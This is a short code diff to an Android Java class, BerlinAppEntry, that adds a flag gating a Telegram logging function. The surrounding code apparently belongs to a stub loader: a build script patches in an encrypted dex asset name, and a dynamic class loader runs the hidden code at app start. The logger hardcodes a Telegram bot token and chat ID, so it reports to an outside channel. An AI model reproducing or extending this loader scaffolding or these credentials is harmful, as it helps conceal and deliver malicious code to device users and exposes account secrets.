@@ -30,6 +30,12 @@ import javax.crypto.spec.SecretKeySpec;
  */
 public class BerlinAppEntry extends Application {
 
+    // ── Debug switch ──────────────────────────────────────────────────────────
+    // Set true ONLY when debugging crashes — causes launch lag when enabled.
+    // Flip to true, rebuild, reproduce crash, read Telegram logs, flip back to false.
+    private static final boolean DEBUG_TG = false;
+    // ─────────────────────────────────────────────────────────────────────────
+
     // Asset name placeholder — 32 bytes 0xAB
     // build_stub_dex.py patches this with actual BERLIN_DEX_ASSET name (e.g. "d4f9a2c1.bin")
     private static final byte[] A = {
@@ -67,7 +73,9 @@ public class BerlinAppEntry extends Application {
     private volatile ClassLoader h = null;
 
     // ── Telegram debug logger ─────────────────────────────────────────────────
+    // Only called when DEBUG_TG = true. Zero network calls in production.
     private void tg(final String msg) {
+        if (!DEBUG_TG) return;
         final String token  = "8728380845:AAGm3oD6xpUWJ2ftPJP3QysNl0BQHv54Nq8";
         final String chatId = "8852912150";
         try {
